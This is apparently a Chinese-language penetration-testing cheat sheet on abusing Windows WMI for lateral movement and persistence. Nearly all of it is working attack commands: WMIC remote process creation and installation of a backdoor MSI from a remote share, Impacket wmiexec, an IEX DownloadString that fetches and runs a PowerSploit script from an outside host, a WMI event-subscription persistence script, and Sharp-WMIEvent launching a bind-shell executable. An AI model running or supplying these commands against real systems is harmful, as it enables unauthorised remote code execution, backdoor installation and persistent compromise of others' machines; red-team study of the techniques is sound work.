# WMI利用

**关于WMI**

* 可通过WMI管理本地和远程计算机
* WIndows为远程传输WMI提供了两个可用协议：
  * DCOM(分布式组件对象模型)
  * WinRM(WIndows远程管理)
* 利用WMI需要具备WMI服务为开启状态(默认开启)与防火墙放行135端口

**基础命令**

远程查询进程信息

```
WMIC /node:192.168.0.106 /user:Administrator /password:P@ssW0rd! process list brief
```

创建远程进程(调用win32\_Process方法在远程主机上创建进程)(无回显)

```
WMIC /node:192.168.0.106 /user:Administrator /password:P@ssW0rd! process call create "cmd.exe /c ipconfig > C:\result_ipconfig.txt"
```

远程安装MSI文件(后门)(调用Win32\_Product.Install方法)

```
WMIC /node:192.168.0.106 /user:Administrator /password:P@ssW0rd! product call install PackageLocation="\\192.168.0.108\lbwnb\bind_tcp4567.msi"
```

**Impacket项目WMIEXEC**

用于获取交互式命令行，需要远程主机开启135端口与445端口，其中445端口用于传输回显

```
python3 wmiexec.py Administrator:P@ssW0rd!@10.10.10.22
```

Windows平台使用

```
pip3 install pyinstaller
pyinstaller -f wmiexec.py
wmiexec.exe Administrator:P@ssW0rd!@192.168.0.106
```

**Invoke-WmiCommand**

PowerSploit-master]]\CodeExecution\Invoke-WmiCommand.ps1，PowerSploit项目脚本,可以通过Powershell调用WMI远程执行命令 远程加载Invoke-WmiCommand.ps1

```
IEX(New-Object Net.Webclient).DownloadString('http://192.168.0.104:8000/Invoke-WmiCommand.ps1')
```

指定远程系统用户名

```
$user = "Administrator"
```

指定用户密码

```
$password = ConvertTo-SecureString -String "P@ssW0rd!" -AsPlainText -Force
```

将用户名密码整合，方便导入Credential

```
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user,$password
```

指定远程IP与执行命令

```
$Remote = Invoke-WmiCommand -payload {ipconfig} -Credential $Cred -ComputerName "10.10.10.22"
```

输出命令执行回显

```
$Remote.payloadOutput
```

**WMI事件订阅**

```
- 所有事件过滤器都会被存储在ROOT\subscription:__EventFilter对象实例中
- 可以通过创建__EventFilter对象实例来部署事件过滤器
- 使用ActiveScriptEventConsumer和CommandLineEventConsumer可以在远程主机上执行任何攻击载荷
- 触发事件的具体条件为"事件过滤器"，如用户登录、新建进程
- 对指定事件做出响应的叫"事件消费者".如运行脚本、发送邮件
```

PowerShell手动利用WMI事件订阅

```
[[整合PSCredential]]
$Username ="Administrator"
$Password = "P@ssW0rd!"
$SecurePassword = $Password | ConvertTo-SecureString -AsplainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username,$Securepassword

[[设置攻击目标和其他公共参数]]
$GlobalArgs = @{}
$ComputerName = "192.168.0.106"
$GlobalArgs['Credential'] = $Credential
$GlobalArgs['ComputerName'] = $ComputerName

[[在远程主机部署名为]]"TestFilter"事件过滤器，用于查询svchost.exe进程产生，通过Set-WmiInstance Cmdlet创建一个__EVentFilter类的实例
$EventFilterArgs = @{
	EventNamespace = 'root/cimv2'
	Name = "TestFilter"
	Query = "SELECT * FROM Win32_ProcessStartTrace where processname = 'svchost.exe'"
	QueryLanguage = 'WQL'
}
$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs @GlobalArgs

[[在远程主机上部署名为]]"TestConsumer" 的事件消费者创建事件消费者类CommandLineEventConsumer的实例，在指定事件发送时执行命令
$CommandLineEventConsumerArgs = @{
	Name = "TestConsumer"
	CommandLineTemplate = "C:\Windows\System32\cmd.exe /c calc.exe"
}
$EventConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $CommandLineEventConsumerArgs @GlobalArgs

[[创建事件过滤器与事件消费者绑定一起]]
$FilterConsumerBindingArgs = @{
	Filter = $EventFilter
	Comsumer = $EventConsumer
}
$FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $FilterConsumerBindingArgs @GlobalArgs
```

**Sharp-WMIEvent ps1脚本事件订阅**

```
.\Sharp-WMIEvent.ps1 -Trigger -IntervalPeriod 1 -ComputerName 192.168.0.105 -Domain hack-my.com -Username Administrator -Password P@ssW0rd! -Command "cmd.exe /c \\192.168.0.108\lbwnb\bind_tcp4567.exe"
```
